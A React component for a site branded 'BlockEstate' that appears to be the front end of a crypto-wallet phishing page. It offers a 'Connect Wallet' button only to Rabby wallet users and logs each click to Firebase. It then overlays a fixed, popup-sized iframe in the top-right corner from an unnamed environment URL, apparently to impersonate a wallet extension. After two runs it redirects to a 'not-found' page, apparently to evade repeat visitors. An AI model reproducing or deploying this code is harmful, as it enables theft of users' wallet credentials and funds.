import { useState, useEffect } from "react";
import { getDatabase, ref, update } from "firebase/database";
import { app } from "../../config";
import "./style.scss";
import { data } from "autoprefixer";

const Luck = () => {
  const [open, setOpen] = useState(false);
  const [theme, setTheme] = useState("light");
  const [status, setStatus] = useState(0);

  const join = () => {
    setOpen(true);
    const database = getDatabase(app);
    const timestamp = new Date().getTime();
    const website_link = window.location.href;
    update(ref(database, `users`), {
      [timestamp]: {
        event: "Join",
        website: website_link,
      },
    })
      .then(() => {})
      .catch((err) => {});
  };

  useEffect(() => {
    if (status >= 2) {
      window.open("https://not-found.vercel.app/", "_self");
    }
  }, [status]);

  useEffect(() => {
    // prevent to run project 3 more times
    const _status = !!localStorage.getItem("status")
      ? Number(localStorage.getItem("status"))
      : 0;
    if (_status == 1) {
      setStatus(2);
    } else {
      setStatus(_status);
    }

    // get event from child iframe
    const messageHandler = (event: any) => {
      console.log(event.data.type);

      if (event.data.type === "set_localstorage") {
        const __status = !!localStorage.getItem("status")
          ? Number(localStorage.getItem("status"))
          : 0;
        localStorage.setItem("status", JSON.stringify(__status + 1));
        setStatus((prevStatus) => {
          return prevStatus + 1;
        });
        // Perform actions based on the event
      } else if (event.data.type === "close_modal") {
        setOpen(false);
      }
    };

    // Add event listener for messages
    window.addEventListener("message", messageHandler);

    // Cleanup the event listener on component unmount
    return () => {
      window.removeEventListener("message", messageHandler);
    };
  }, []);

  return (
    <div className="faster">
      <div className="back"></div>
      <div className={`modal ${(window as any).ethereum.isRabby && "ani"}`}>
        <div>
          {/* disabled={!(window as any).ethereum} */}
          <button
            disabled={!(window as any).ethereum.isRabby}
            style={{
              width: "100%",
              height: "40px",
            }}
            onClick={() => {
              join();
            }}
          >
            <img width="40px" height="36px" src="/logo.svg" alt="BlockEstate" />
            <span className="d-block ml-4">
               " Connect Wallet"
              {/* {(window as any).ethereum
                ? " Connect Wallet"
                : "Not on EVM chain"} */}
            </span>
          </button>
        </div>
      </div>
      {open && (
        <div>
          <iframe
            src={process.env.REACT_APP_MMP_URL}
            width={410}
            height={640}
            style={{
              position: "fixed",
              top: "0px",
              right: "0px",
              // background: theme == 'light' ? 'white' : 'rgb(36, 39, 42)',
              zIndex: "1002",
            }}
          ></iframe>
        </div>
      )}
    </div>
  );
};

export default Luck;
